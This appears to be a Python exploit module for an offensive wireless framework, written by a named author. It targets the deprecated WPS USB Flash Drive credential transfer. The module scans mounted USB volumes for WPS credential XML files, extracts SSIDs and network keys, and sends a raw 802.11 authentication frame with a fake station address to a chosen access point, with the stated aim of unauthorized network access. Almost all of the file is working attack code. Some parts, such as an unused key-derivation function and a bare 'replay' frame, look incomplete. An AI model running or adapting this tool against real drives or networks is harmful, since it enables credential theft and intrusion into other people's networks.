# Author: Andre Henrique (LinkedIn/X: @mrhenrike)
import hashlib
import os
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """WPS USB Flash Drive Token Credential Extraction and Replay.

    Wi-Fi Protected Setup supports USB Flash Drive (UFD) as an
    out-of-band transport for network credentials. When a user inserts
    a USB drive into a WPS-capable AP, the AP writes an XML credential
    file to the drive. The user then inserts the same drive into
    a client device to configure the WiFi connection automatically.

    This module targets the UFD-based credential transfer by:
    1. Scanning mounted USB volumes for WPS credential XML files
    2. Extracting SSID, authentication type, and network key
    3. Replaying the extracted credentials for unauthorized access

    The WPS UFD specification (now deprecated) stored credentials in
    plaintext XML, making any physical access to the USB drive
    sufficient for full credential compromise.

    CVSS: N/A (deprecated WPS UFD specification weakness)

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "WPS USB Flash Drive Token Credential Extraction",
        "description": (
            "Extracts Wi-Fi credentials from WPS USB Flash Drive (UFD) "
            "token files. The WPS UFD specification stores network "
            "credentials in plaintext XML on USB drives, enabling "
            "extraction and replay by anyone with physical drive access."
        ),
        "authors": (
            "Wi-Fi Alliance (WPS UFD specification)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://www.wi-fi.org/discover-wi-fi/wi-fi-protected-setup",
            "https://docs.microsoft.com/en-us/windows/win32/wps/portal",
        ),
        "disclosure_date": "2007-01-08",
        "platform": "linux",
        "arch": "all",
        "privileged": False,
        "targets": (
            "USB drives containing WPS credential XML",
            "APs that support WPS UFD (legacy, pre-WPS 2.0)",
        ),
    }

    interface = OptString("wlan0mon", "Monitor-mode wireless interface (for replay)")
    target = OptIP("", "Target AP BSSID for credential replay")
    port = OptPort(1, "Not used")
    timeout = OptFloat(5.0, "Socket timeout in seconds")
    usb_mount_path = OptString("/media", "Base path to search for mounted USB volumes")
    credential_file = OptString("", "Direct path to WPS credential XML file")

    # WPS UFD XML tag names
    _TAG_SSID = "ssid"
    _TAG_NETWORK_KEY = "networkKey"
    _TAG_AUTH_TYPE = "authentication"
    _TAG_ENCRYPTION = "encryption"
    _TAG_KEY_PROVIDED = "keyProvidedAutomatically"

    # Known WPS UFD file patterns
    _WPS_UFD_FILENAMES = (
        "SMRTNTKY/WSETTING.WFC",
        "SMRTNTKY/WSetting.wfc",
        ".wps_credentials.xml",
        "wps_config.xml",
    )

    _BROADCAST = b"\xff\xff\xff\xff\xff\xff"
    _FAKE_STA = b"\x02\x00\xca\xfe\x00\x02"

    def _scan_usb_volumes(self) -> list:
        """Scan mounted volumes for WPS credential files."""
        found = []
        base = str(self.usb_mount_path)
        if not os.path.isdir(base):
            return found

        for root, dirs, files in os.walk(base):
            for pattern in self._WPS_UFD_FILENAMES:
                candidate = os.path.join(root, pattern)
                if os.path.isfile(candidate):
                    found.append(candidate)

            # Also look for any .wfc files
            for f in files:
                if f.lower().endswith(".wfc") or f.lower().endswith(".xml"):
                    full = os.path.join(root, f)
                    if full not in found:
                        found.append(full)

            # Limit depth to 3 levels
            depth = root.replace(base, "").count(os.sep)
            if depth >= 3:
                dirs.clear()

        return found

    def _parse_wps_xml(self, content: str) -> dict:
        """Parse WPS credential XML (simplified, no external deps)."""
        creds = {"ssid": None, "key": None, "auth_type": None, "encryption": None}

        import re
        for tag, field in [
            (self._TAG_SSID, "ssid"),
            (self._TAG_NETWORK_KEY, "key"),
            (self._TAG_AUTH_TYPE, "auth_type"),
            (self._TAG_ENCRYPTION, "encryption"),
        ]:
            pattern = rf"<{tag}[^>]*>(.*?)</{tag}>"
            match = re.search(pattern, content, re.IGNORECASE | re.DOTALL)
            if match:
                creds[field] = match.group(1).strip()

        return creds

    def _compute_pmk(self, passphrase: str, ssid: str) -> bytes:
        """Compute PMK from passphrase and SSID (PBKDF2-SHA1)."""
        return hashlib.pbkdf2_hmac("sha1", passphrase.encode(), ssid.encode(), 4096, 32)

    def _open_raw_wifi(self) -> socket.socket | None:
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.settimeout(self.timeout)
            sock.bind((str(self.interface), 0))
            return sock
        except OSError:
            return None

    @mute
    def check(self) -> bool:
        """Check if credential files or USB volumes are accessible."""
        if self.credential_file:
            return os.path.isfile(str(self.credential_file))
        volumes = self._scan_usb_volumes()
        return len(volumes) > 0

    def run(self) -> None:
        if not self.credential_file and not os.path.isdir(str(self.usb_mount_path)):
            print_error(
                "No credential file specified and USB mount path not accessible. "
                "Provide credential_file or ensure USB drives are mounted."
            )
            return

        print_success("Starting WPS USB token credential extraction")
        self._exploit()

    def _exploit(self) -> None:
        # Step 1: locate credential files
        if self.credential_file:
            files = [str(self.credential_file)]
        else:
            print_status(f"Scanning {self.usb_mount_path} for WPS credential files")
            files = self._scan_usb_volumes()
            if not files:
                print_error("No WPS credential files found on mounted USB volumes")
                return
            print_info(f"Found {len(files)} candidate file(s)")

        # Step 2: extract credentials
        all_creds = []
        for fpath in files:
            print_status(f"Parsing: {fpath}")
            try:
                with open(fpath) as f:
                    content = f.read()
                creds = self._parse_wps_xml(content)
                if creds["ssid"]:
                    all_creds.append(creds)
                    print_success(
                        f"  SSID: {creds['ssid']}, "
                        f"Auth: {creds['auth_type'] or 'unknown'}, "
                        f"Key: {'[extracted]' if creds['key'] else '[none]'}"
                    )
                else:
                    print_info(f"  No WPS credentials found in {fpath}")
            except OSError as e:
                print_error(f"  Cannot read {fpath}: {e}")

        if not all_creds:
            print_error("No valid WPS credentials extracted")
            return

        print_success(f"Extracted credentials from {len(all_creds)} network(s)")

        # Step 3: attempt replay if interface is available
        if self.target and ":" in str(self.target):
            raw = self._open_raw_wifi()
            if raw:
                print_status("Replaying extracted credentials via WiFi association")
                fc = struct.pack("<H", 0x00B0)  # Auth
                duration = struct.pack("<H", 0)
                bssid = bytes(int(b, 16) for b in str(self.target).split(":"))
                header = fc + duration + bssid + self._FAKE_STA + bssid + struct.pack("<H", 0)
                auth_body = struct.pack("<HHH", 0, 1, 0)
                frame = header + auth_body
                try:
                    raw.send(frame)
                    print_success(
                        "Authentication frame sent. The extracted PSK can be "
                        "used for WPA2 four-way handshake to gain network access."
                    )
                except OSError as e:
                    print_error(f"Replay failed: {e}")
                raw.close()
            else:
                print_info(
                    "Monitor interface not available for replay; "
                    "credentials extracted for offline use"
                )
